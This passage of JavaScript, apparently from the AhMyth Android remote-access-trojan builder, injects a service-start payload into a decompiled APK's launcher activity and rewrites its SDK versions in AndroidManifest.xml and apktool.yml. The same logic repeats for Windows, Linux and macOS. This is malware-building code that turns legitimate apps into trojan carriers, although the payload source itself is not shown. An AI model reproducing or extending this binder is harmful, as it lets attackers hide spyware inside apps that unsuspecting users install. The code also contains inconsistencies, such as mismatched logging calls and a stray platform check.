                            console.log("[★] Modifiying Launcher Activity...");;
                            var output = data.replace(hook, startService);
                            fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                                if (error) {
                                    console.log('[★] Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);;
                                    return;
                                }

                                console.log("[★] Determining Target SDK Version...");

                                fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                                    if (error) {
                                        console.log("[★] Reading the Manifest Target SDK Failed.")

                                        return;
                                    }

                                    console.log("[★] Modifying the Target SDK Version...");;
                                    var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                                    var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                                    var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                    var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/
                                    var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"').replace(compSdkVerNameRegex, "$111" + '"').replace(platVerCoRegex, "$122" + '"').replace(platVerNameRegex, "$111" + '"');
                                    fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                        if (error) {
                                            console.log('[★] Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);;
                                            return;
                                        }

                                        fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                            if (error) {
                                                console.log("[★] Modifying the 'apktool.yml' Target SDK Failed!");;
                                                return;
                                            }

                                            var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                            var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
                                            var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
                                            fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                                if (error) {
                                                    $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")

                                                    return;
                                                }

                                                // $appCtrl.copyAhmythFilesAndGenerateApk

                                            });

                                        });

                                    });

                                });

                            });

                        });

                    });

                } else if (process.platform === "linux") {
                    console.log("[★] Locating Launcher Activity...");;
                    exec('find -name "' + launcherActivity + '"', {
                        cwd: apkFolder
                    }, (error, stdout, stderr) => {
                        var launcherPath = stdout.substring(stdout.indexOf("./") + 2).trim("\n");
                        if (error !== null) {
                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                            return;
                        } else if (!launcherPath) {
                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                            return;
                        } else {
                            console.log("[★] Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);;
                        }

                        console.log("[★] Reading Launcher Activity...");
                        fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                            if (error) {
                                console.log('[★] Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                                console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                                return;
                            }

                            var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;

                            var hook = CONSTANTS.hookPoint;
                            console.log("[★] Modifiying Launcher Activity...");;
                            var output = data.replace(hook, startService);
                            fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                                if (error) {
                                    console.log('[★] Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);;
                                    return;
                                }

                                console.log("[★] Determining Target SDK Version...");

                                fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                                    if (error) {
                                        console.log("[★] Reading the Manifest Target SDK Failed.")

                                        return;
                                    }

                                    console.log("[★] Modifying the Target SDK Version...");;
                                    var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                                    var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                                    var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                    var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/
                                    var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"').replace(compSdkVerNameRegex, "$111" + '"').replace(platVerCoRegex, "$122" + '"').replace(platVerNameRegex, "$111" + '"');
                                    fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                        if (error) {
                                            console.log('[★] Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);;
                                            return;
                                        }

                                        fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                            if (error) {
                                                console.log("[★] Modifying the 'apktool.yml' Target SDK Failed!");;
                                                return;
                                            }

                                            var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                            var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
                                            var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
                                            fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                                if (error) {
                                                    $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")

                                                    return;
                                                }

                                                // $appCtrl.copyAhmythFilesAndGenerateApk

                                            });

                                        });

                                    });

                                });

                            });

                        });

                    });

                } else {
                    (process.platform === "darwin");
                    console.log("[★] Locating Launcher Activity...");;
                    exec('find ' + '"' + apkFolder + '"' + ' -name ' + '"' + launcherActivity + '"', (error, stdout, stderr) => {
                        var launcherPath = stdout.split(apkFolder).pop(".smali").trim("\n").replace(/^\/+/g, '');
                        if (error !== null) {
                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                            return;
                        } else if (!launcherPath) {
                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                            return;
                        } else {
                            console.log("[★] Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);;
                        }

                        console.log("[★] Reading Launcher Activity...");;
                        fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                            if (error) {
                                console.log('[★] Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAILED);
                                console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                                return;
                            }

                            var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;

                            var hook = CONSTANTS.hookPoint;
                            console.log("[★] Modifiying Launcher Activity...");;
                            var output = data.replace(hook, startService);
                            fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                                if (error) {
                                    console.log('[★] Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);;
                                    return;
                                }

                                console.log("[★] Determining Target SDK Version...");

                                fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                                    if (error) {
                                        console.log("[★] Reading the Manifest Target SDK Failed.")

                                        return;
                                    }

                                    console.log("[★] Modifying the Target SDK Version...");;
                                    var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                                    var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                                    var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                    var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/;
                                    var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"').replace(compSdkVerNameRegex, "$111" + '"').replace(platVerCoRegex, "$122" + '"').replace(platVerNameRegex, "$111" + '"');
                                    fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                        if (error) {
                                            console.log('[★] Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);;
                                            return;
                                        }

                                        fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                            if (error) {
                                                console.log("[★] Modifying the 'apktool.yml' Target SDK Failed!");;
                                                return;
                                            }

                                            var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                            var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
                                            var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
                                            fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                                if (error) {
                                                    $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")

                                                    return;
                                                }

                                                // $appCtrl.copyAhmythFilesAndGenerateApk

                                            });

                                        });

                                    });

                                });

                            });

                        });

                    });

                };

            });

        });

    });
//};
```
